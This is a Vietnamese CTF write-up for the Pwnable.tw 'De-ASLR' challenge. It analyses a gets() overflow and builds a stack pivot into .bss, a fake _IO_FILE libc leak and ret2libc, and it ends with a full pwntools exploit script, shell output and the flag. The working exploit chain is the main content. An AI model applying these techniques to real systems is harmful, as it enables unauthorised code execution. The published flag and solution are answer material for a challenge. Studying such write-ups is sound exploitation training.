+++
title = 'Pwnable.tw - De-ASLR'
date = 2026-09-24T16:41:51+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## De-ASLR

`nc chall.pwnable.tw 10402`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/De-ASLR/deaslr_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
```

libc đi kèm glibc 2.23. Toàn bộ chương trình:

```c
int main(void) {
    char buf[0x10];
    gets(buf);          // không giới hạn
    return 0;           // leave; ret
}
```

Ngoài `__libc_start_main` thì `gets` là hàm libc duy nhất được import - **không có hàm xuất nào**. Buffer 16 bytes, RIP ở offset 24, NX nên không shellcode, Full RELRO nên `.got` và `.dynamic` read-only, và libc thì ASLR đầy đủ mà không có cách nào leak. Đúng như tên bài.

#### Bẫy đầu tiên - dùng đúng binary của server

Bản local `deaslr_patched` (interp `ld-2.23.so` + `RUNPATH .`) có cùng build-id và cùng `.text`, nhưng `patchelf --set-interpreter <đường dẫn tuyệt đối> --set-rpath .` **dời cả ELF header và LOAD segment đầu tiên**:

| trường | `deaslr` của server | `deaslr_patched` |
|---|---|---|
| LOAD đầu | `0x400000 R E` | `0x3fe000 RW` |
| `.dynamic` | `0x600dd8` nằm trong GNU_RELRO | `0x3fe3d0` (ghi được) |
| `.got` | `0x600fc8` (RELRO) | `0x600fc8` |
| slot `DT_DEBUG` | `0x600ea0` | `0x3fe4a8` |

Mọi kỹ thuật ghi vào `.dynamic` chạy được trên bản patched nhưng segfault trên server, vì ở đó page chưa map và `.dynamic` lại read-only dưới Full RELRO. Luôn diff program header và địa chỉ `.dynamic` với file tải về trước khi reverse.

Muốn có bản local giữ nguyên layout thì `patchelf --set-interpreter /tmp/ld223.so` (đường dẫn **ngắn** vừa chỗ `.interp` cũ nên không bị dời) cộng `LD_LIBRARY_PATH` lúc chạy.

### 2. Khai thác

Không có primitive leak, `.got` và `.dynamic` không sửa được. Ý tưởng: pivot stack vào `.bss`, leak libc bằng `_IO_file_write`, rồi ret2libc.

#### Ghi không giới hạn tại địa chỉ cố định

`main` kết thúc bằng `leave; ret` = `mov rsp,rbp; pop rbp; ret`. Ghi đè saved `rbp` thành một địa chỉ `.bss` cố định và saved rip thành `0x40053e` (`main_gets`, lệnh ngay sau `call gets`):

```py
payload = b'A'*0x10 + p64(FAKE_STACK+0x10) + p64(0x40053e)
```

Sau `leave; ret` thì `rbp = FAKE_STACK+0x10`, nên `gets` kế tiếp ghi tại `rbp-0x10 = FAKE_STACK`, rồi lại return qua `leave; ret`. Đây là vòng lặp ghi tuỳ ý, không giới hạn, tại địa chỉ biết trước - đủ để dựng dần ROP chain và các struct giả trong `.bss`.

#### Con trỏ libc tự rơi vào stack giả

Khi stack đang nằm trong `.bss`, các lệnh `call` nội bộ của libc đẩy địa chỉ trả về lên chính cái stack ta mượn. Một cái rơi vào địa chỉ cố định `0x601408` và bằng `_IO_2_1_stdin_` = `libc_base + 0x3c38e0`.

Đó là "leak" của ta: không đọc được nó, nhưng biết nó nằm ở đâu.

#### Biến `_IO_file_write` thành hàm in

Dựng fake `_IO_FILE` (`flags = 0xfbad2084`, `_IO_write_base`/`_ptr` sắp đặt sẵn) tại `0x601460`, rồi gọi `_IO_file_write(fake_fp, 0x601408, 8)` qua gadget call của `__libc_csu_init`:

```asm
0x4005a0: mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]
0x4005ba: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

```py
libc_base = u64(io.recv(8)) - 0x3c38e0
assert libc_base & 0xfff == 0
```

#### ret2libc

```py
system  = libc_base + libc.symbols['system']    # 0x45390
pop_rdi = libc_base + 0x21102                   # pop rdi ; ret
io.sendline(p64(0) + p64(pop_rdi) + p64(0x6014e0) + p64(system))
```

Không brute force, không đoán ASLR.

#### Các hướng đã loại

- **ret2dl_init / fake link_map qua `DT_DEBUG`**: gọn và không cần leak, chạy được nếu `.dynamic` ghi được, nhưng trên server `.dynamic` nằm trong `GNU_RELRO` và hàng xóm của slot `DT_DEBUG` là một `d_tag`, nên `call_init` deref `l_name` là fault.
- **Partial overwrite GOT hoặc return address của libc**: Full RELRO khoá GOT, còn 28 bit base ngẫu nhiên thì không khả thi.
- **ret2dlresolve**: chết vì `BIND_NOW` (`GOT[1] = GOT[2] = 0`, `PLT[0]` nhảy vào NULL).

```bash
[+] libc base = 0x7f2029203000
uid=1000(deaslr) gid=1000(deaslr) groups=1000(deaslr)
FLAG{R0P_H4rd_TO_D3F3AT_ASLR}
```

`FLAG: FLAG{R0P_H4rd_TO_D3F3AT_ASLR}`

```py
#!/usr/bin/env python3
from pwn import *

exe  = ELF('./deaslr_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
context.binary = exe

MAIN_GETS = 0x40053e; LEAVE_RET = 0x400554
CSU_CALL  = 0x4005a0; CSU_POP   = 0x4005ba
SAFE_AREA = 0x601400; FAKE_STACK = 0x601800; FAKE_FP = 0x601460
LEAK_SLOT = 0x601408; STDIN_OFF = 0x3c38e0

io = remote('chall.pwnable.tw', 10402) if args.REMOTE else process([exe.path])

# pivot #1 -> FAKE_STACK, pivot #2 -> SAFE_AREA, đắp fake FILE + "/bin/sh"
payload1 = b'A'*0x10 + p64(FAKE_STACK+0x10) + p64(MAIN_GETS)
payload2 = b'A'*0x10 + p64(SAFE_AREA+0x10)  + p64(MAIN_GETS)
fake_fp  = flat([0xfbad2084,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0xffffffffffffffff])
payload3 = b'A'*0x10 + p64(0x601770)+p64(MAIN_GETS) \
         + p64(0x6017b0)+p64(MAIN_GETS) + p64(0x6017c0)+p64(MAIN_GETS) \
         + p64(0x6017e0)+p64(MAIN_GETS) + p64(0x601808)+p64(MAIN_GETS) \
         + fake_fp + b'/bin/sh\x00'
# dọn thanh ghi cho CSU_CALL -> _IO_file_write(fake_fp, LEAK_SLOT, 8)
payload4 = b'A'*0x10 + p64(SAFE_AREA+0x20) + p64(LEAVE_RET) + p64(CSU_POP) + p64(0x6a76b) + p64(0x6a76c)
payload5 = p64(8) + p64(LEAK_SLOT) + p64(SAFE_AREA+0x30) + p64(LEAVE_RET)
payload6 = p64(FAKE_FP) + p64(CSU_CALL) + p64(SAFE_AREA+0x40) + p64(LEAVE_RET)
payload7 = p64(FAKE_STACK) + b'A'*8 + p64(SAFE_AREA+0x50) + p64(LEAVE_RET)
payload8 = p64(MAIN_GETS) + b'A'*8 + p64(0x601778) + p64(LEAVE_RET)
for pl in (payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8):
    io.sendline(pl)

libc_base = u64(io.recv(8)) - STDIN_OFF
log.success(f'libc base = {libc_base:#x}')
assert libc_base & 0xfff == 0

system  = libc_base + 0x45390
pop_rdi = libc_base + 0x21102
io.sendline(p64(0) + p64(pop_rdi) + p64(0x6014e0) + p64(system))

io.sendline(b'cat /home/deaslr/flag')
io.interactive()
```
